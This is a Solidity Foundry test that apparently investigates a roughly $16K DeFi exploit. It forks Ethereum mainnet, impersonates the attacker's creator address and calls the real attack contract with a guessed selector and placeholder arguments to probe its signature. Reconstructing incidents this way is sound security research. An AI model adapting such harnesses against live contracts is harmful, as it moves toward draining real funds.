// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../interface.sol";

// @KeyInfo - Total Lost : ~$16K
// creator : https://etherscan.io/address/0x7d9bc45a9abda926a7ce63f78759dbfa9ed72e26
// Attack Contract : https://etherscan.io/address/0xe897c0f9443785f8d4f0fa6e92a81066b3fbfee2
// Helper Attack Contract : https://etherscan.io/address/0xa8c6e7352b13815f6bfa87c7ffaaa6e3a7bfa849
// Vulnerable Contract : https://etherscan.io/address/0x319ec3ad98cf8b12a8be5719fec6e0a9bb1ad0d1
// Attack Tx : https://etherscan.io/tx/0xbd72bccec6dd824f8cac5d9a3a2364794c9272d7f7348d074b580e3c6e44312e

// @Analysis
// https://twitter.com/DecurityHQ/status/1698064511230464310

contract DAppTest is Test {
    // known
    address private constant creator = address(0x7d9bC45a9ABDA926A7Ce63f78759dBFA9Ed72e26);
    address private constant suspect = address(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2);

    // to guess
    // IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    // IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    // address private constant target = address(0x319Ec3AD98CF8b12a8BE5719FeC6E0a9bb1ad0D1);

    function setUp() public {
        vm.createSelectFork("mainnet", 18_048_982);
        // vm.label(address(USDT), "USDT");
        // vm.label(address(USDC), "USDC");
    }

    function testSignature1() public {
        vm.startPrank(address(creator), address(creator));

        // emit log_named_decimal_uint("creator USDT balance before exploit", USDT.balanceOf(creator), 6);
        // emit log_named_decimal_uint("creator USDC balance before exploit", USDC.balanceOf(creator), USDC.decimals());

        // non-addresses
        suspect.call(abi.encodeWithSelector(
            0x0aeb4ddf,
            0xab4aab4bab4cab4dab4eab4fab50ab51ab52ab53ab54ab55ab56ab57ab58ab59,
            0xab5aab5bab5cab5dab5eab5fab60ab61ab62ab63ab64ab65ab66ab67ab68ab69,
            0xab6aab6bab6cab6dab6eab6fab70ab71ab72ab73ab74ab75ab76ab77ab78ab79,
            0xab7aab7bab7cab7dab7eab7fab80ab81ab82ab83ab84ab85ab86ab87ab88ab89));

        // emit log_named_decimal_uint("creator USDT balance after exploit", USDT.balanceOf(creator), 6);
        // emit log_named_decimal_uint("creator USDC balance after exploit", USDC.balanceOf(creator), USDC.decimals());
        vm.stopPrank();
    }

    function testSignature2() public {
        vm.startPrank(address(creator), address(creator));

        // emit log_named_decimal_uint("creator USDT balance before exploit", USDT.balanceOf(creator), 6);
        // emit log_named_decimal_uint("creator USDC balance before exploit", USDC.balanceOf(creator), USDC.decimals());

        // (address, bytes, bytes, bytes)
        suspect.call(abi.encodeWithSelector(
            0x0aeb4ddf,
            0x000000000000000000000000aaaaaaabaaacaaadaaaeaaafaab0aab1aab2aab3,
            0xab4aab4bab4cab4dab4eab4fab50ab51ab52ab53ab54ab55ab56ab57ab58ab59,
            0xab5aab5bab5cab5dab5eab5fab60ab61ab62ab63ab64ab65ab66ab67ab68ab69,
            0xab6aab6bab6cab6dab6eab6fab70ab71ab72ab73ab74ab75ab76ab77ab78ab79));

        // emit log_named_decimal_uint("creator USDT balance after exploit", USDT.balanceOf(creator), 6);
        // emit log_named_decimal_uint("creator USDC balance after exploit", USDC.balanceOf(creator), USDC.decimals());
        vm.stopPrank();
    }
}
